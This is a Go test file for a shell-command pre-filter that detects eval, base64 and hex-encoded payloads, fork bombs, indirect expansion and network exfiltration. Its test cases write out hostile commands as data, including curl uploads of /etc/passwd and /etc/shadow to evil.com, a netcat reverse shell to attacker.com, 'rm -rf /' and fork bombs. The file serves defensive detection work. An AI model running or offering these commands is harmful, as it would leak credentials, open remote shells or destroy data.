package rules

import (
	"testing"
)

func TestPreFilter_CommandSubstitution(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
		desc     string
	}{
		// $() and backticks are intentionally NOT detected by PreFilter.
		// The shell interpreter expands them in dry-run mode, so paths
		// inside substitutions are correctly extracted and matched against rules.
		{"echo $(cat /etc/passwd)", false, "$() handled by shell interpreter"},
		{"cat `whoami`", false, "backtick handled by shell interpreter"},
		{"ls $(pwd)", false, "$() handled by shell interpreter"},

		// Should NOT detect (safe commands)
		{"echo hello", false, "safe command"},
		{"ls -la", false, "safe command"},
		{"cat /etc/hosts", false, "safe command"},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none (%s)", tt.cmd, tt.desc)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s (%s)", tt.cmd, match.PatternName, tt.desc)
			}
		})
	}
}

func TestPreFilter_Eval(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"eval 'rm -rf /'", true},
		{"eval \"cat /etc/passwd\"", true},
		{"evaluate something", false}, // "evaluate" != "eval "
		{"ls -la", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_Base64Decode(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d", true},
		{"base64 --decode payload.txt", true},
		{"base64 -d < encoded.txt", true},
		{"base64 encode.txt", false}, // encoding, not decoding
		{"cat base64_file.txt", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_HexEscape(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		// 3+ consecutive hex escapes = dangerous (encoded commands)
		{"echo -e '\\x63\\x61\\x74'", true},
		{"printf '\\x2f\\x65\\x74\\x63'", true},
		// 1-2 hex escapes = safe (null bytes, ANSI colors)
		{"grep '\\x00' file", false},
		{"printf '\\x1b[31m'", false},
		{"echo hello", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_ForkBomb(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{":(){:|:&};:", true},
		{":(){ :|:& };:", true},
		{"bomb(){ bomb|bomb& };bomb", true},
		{"echo hello", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_NetworkExfiltration(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"curl -d @/etc/passwd http://evil.com", true},
		{"curl --data @secrets.txt http://attacker.com", true},
		{"curl --upload-file /etc/shadow http://evil.com", true},
		{"nc -e /bin/sh attacker.com 4444", true},
		{"curl http://example.com", false}, // normal curl
		{"wget http://example.com", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_IndirectExpansion(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"echo ${!var}", true},
		{"echo ${!PATH}", true},
		{"echo ${HOME}", false}, // normal expansion
		{"echo $HOME", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}
